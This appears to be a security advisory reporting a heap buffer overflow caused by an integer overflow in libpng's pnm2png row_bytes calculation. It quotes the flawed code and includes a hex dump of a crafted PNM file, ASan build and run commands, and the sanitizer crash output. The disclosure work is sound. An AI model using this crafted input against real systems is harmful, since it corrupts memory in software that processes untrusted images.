## Heap Buffer Overflow via Integer Overflow in `pnm2png` `row_bytes` Calculation

### Overview

| Field              | Value                                                    |
|--------------------|----------------------------------------------------------|
| **Component**      | `contrib/pngminus/pnm2png.c`                            |
| **Function**       | `do_pnm2png()`                                           |
| **Attack Vector**  | Malicious PNM file (local file input)                    |
| **Tested Version** | libpng 1.8.0.git (commit `0094fdbf3743c238effb88aa92cf2a2ea23ade4a`, v1.6.55-118-g0094fdbf3) |
| **Test Platform**  | macOS (Darwin 24.6.0, x86_64), Apple Clang 16.0.0        |

---

### Root Cause

In `do_pnm2png()` (`contrib/pngminus/pnm2png.c`), the variable `row_bytes` is declared as `png_uint_32`. The `width` and `height` values are read directly from the PNM file header via `fscan_pnm_uint_32()` allowing full attacker control over the range `0` to `4294967295`.


### Guard failure

The code has a guard check but if `row_bytes` wraps to a small non-zero value, both conditions evaluate to false, and execution continues to the allocation.

```c
/* pnm2png.c, lines 368-373 */
if ((row_bytes == 0) ||
    ((size_t) height > (size_t) (-1) / (size_t) row_bytes))
{
    /* too big */
    return FALSE;
}
```
### Resulting Heap Buffer Overflow

At line 387, the undersized buffer is allocated:

```c
/* pnm2png.c, line 387 */
row_pointers[row] = (png_byte *) png_malloc (png_ptr, row_bytes);
```

Then at lines 405-411, the write loop uses the original `width` and `channels` values (not `row_bytes`) to determine how many bytes to write:

```c
/* pnm2png.c, lines 405-411 */
for (col = 0; col < width; col++)
{
    for (i = 0; i < (png_uint_32) (channels - alpha_present); i++)
    {
        if (raw)
        {
            *pix_ptr++ = get_pnm_data (pnm_file, bit_depth);
```

Each pixel writes `channels` bytes (3 for RGB, 8-bit depth), for a total of `width * channels` bytes per row. When this exceeds the allocated `row_bytes`, the writes overflow the heap buffer.

---

## Proof of Concept

PNM file:

```
00000000: 5036 0a31 3433 3136 3535 3736 3620 310a  P6.1431655766 1.
00000010: 3235 350a 4141 4141 4141 4141 4141 4141  255.AAAAAAAAAAAA
```


```bash
cmake .. \
    -DPNG_SHARED=OFF \
    -DPNG_STATIC=ON \
    -DPNG_FRAMEWORK=OFF \
    -DPNG_TESTS=OFF \
    -DPNG_TOOLS=OFF \
    -DCMAKE_C_FLAGS="-fsanitize=address,undefined" \
    -DCMAKE_EXE_LINKER_FLAGS="-fsanitize=address,undefined"

make -j$(nproc)
```

```bash
cc -fsanitize=address,undefined \
    -Ilibpng \
    -Ilibpng/build-asan \
    -o pnm2png \
    libpng/contrib/pngminus/pnm2png.c \
    libpng/build-asan/libpng18.a \
    -lz -lm \
    -fsanitize=address,undefined
```

```bash
ASAN_OPTIONS=detect_leaks=0 ./pnm2png poc_intovf_pnm2png.pnm /dev/null
```

```
=================================================================
==PID==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6020000000f2
WRITE of size 1 at 0x6020000000f2 thread T0
    #0 in do_pnm2png (pnm2png)
    #1 in pnm2png    (pnm2png)
    #2 in main        (pnm2png)

0x6020000000f2 is located 0 bytes after 2-byte region [0x6020000000f0,0x6020000000f2)
allocated by thread T0 here:
    #0 in malloc          (libclang_rt.asan)
    #1 in png_malloc_base (pnm2png)
    #2 in png_malloc      (pnm2png)
    #3 in do_pnm2png      (pnm2png)

SUMMARY: AddressSanitizer: heap-buffer-overflow in do_pnm2png
```
